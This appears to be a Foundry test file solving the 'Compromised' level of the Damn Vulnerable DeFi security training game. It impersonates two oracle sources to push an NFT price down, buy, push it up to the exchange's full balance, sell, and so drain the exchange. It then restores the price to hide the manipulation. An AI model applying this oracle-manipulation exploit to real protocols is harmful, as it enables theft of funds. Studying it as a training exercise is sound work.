// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "ds-test/test.sol";
import "forge-std/vm.sol";
import "../src/levels/Compromised/TrustfulOracle.sol";
import "../src/levels/Compromised/Exchange.sol";
import "../src/levels/Compromised/TrustfulOracleInitializer.sol";

contract CompromisedTest is DSTest {
    Vm private constant vm = Vm(HEVM_ADDRESS);
    address constant deployer =
        address(uint160(uint256(keccak256("DEPLOYER"))));
    address constant player = address(uint160(uint256(keccak256("PLAYER"))));
    uint256 constant EXCHANGE_INITIAL_ETH_BALANCE = 999 ether;
    uint256 constant INITIAL_NFT_PRICE = 999 ether;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 0.1 ether;
    uint256 constant TRUSTED_SOURCE_INITIAL_ETH_BALANCE = 2 ether;

    address[] sources = [
        0xA73209FB1a42495120166736362A1DfA9F95A105,
        0xe92401A4d3af5E446d93D11EEc806b1462b39D15,
        0x81A5D6E50C214044bE44cA0CB057fe119097850c
    ];

    string[] symbols = ["DVNFT", "DVNFT", "DVNFT"];
    uint256[] prices = [
        INITIAL_NFT_PRICE,
        INITIAL_NFT_PRICE,
        INITIAL_NFT_PRICE
    ];

    TrustfulOracle oracle;
    Exchange exchange;
    DamnValuableNFT token;

    function setUp() public {
        vm.startPrank(deployer);
        for (uint8 i = 0; i < sources.length; i++) {
            vm.deal(sources[i], TRUSTED_SOURCE_INITIAL_ETH_BALANCE);
            assertEq(
                address(sources[i]).balance,
                TRUSTED_SOURCE_INITIAL_ETH_BALANCE
            );
        }

        vm.deal(player, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(address(player).balance, PLAYER_INITIAL_ETH_BALANCE);

        TrustfulOracleInitializer initializer = new TrustfulOracleInitializer(
            sources,
            symbols,
            prices
        );
        oracle = initializer.oracle();

        exchange = new Exchange(address(oracle));
        vm.deal(address(exchange), EXCHANGE_INITIAL_ETH_BALANCE);

        token = DamnValuableNFT(exchange.token());
        vm.stopPrank();

        assertEq(token.owner(), 0x0000000000000000000000000000000000000000);
        assertEq(token.rolesOf(address(exchange)), token.MINTER_ROLE());
    }

    function testIsCompromisedClear() public {
        // Private key for Source 2 and Source 3 are to be decoded.
        // Since Foundry has no utility to create Signer from private key we can just use vm.startPrank()
        vm.startPrank(sources[1]);
        oracle.postPrice("DVNFT", 0.01 ether);
        vm.stopPrank();

        vm.startPrank(sources[2]);
        oracle.postPrice("DVNFT", 0.01 ether);
        vm.stopPrank();

        vm.startPrank(player);
        uint256 id = exchange.buyOne{value: 0.01 ether}();
        vm.stopPrank();

        vm.startPrank(sources[1]);
        oracle.postPrice("DVNFT", address(exchange).balance);
        vm.stopPrank();

        vm.startPrank(sources[2]);
        oracle.postPrice("DVNFT", address(exchange).balance);
        vm.stopPrank();

        vm.startPrank(player);
        token.approve(address(exchange), 0);
        exchange.sellOne(id);
        vm.stopPrank();

        vm.startPrank(sources[1]);
        oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
        vm.stopPrank();

        vm.startPrank(sources[2]);
        oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
        vm.stopPrank();

        assertEq(address(exchange).balance, 0);
        assertGt(address(player).balance, EXCHANGE_INITIAL_ETH_BALANCE);
        assertEq(token.balanceOf(player), 0);
        assertEq(oracle.getMedianPrice("DVNFT"), INITIAL_NFT_PRICE);
    }
}
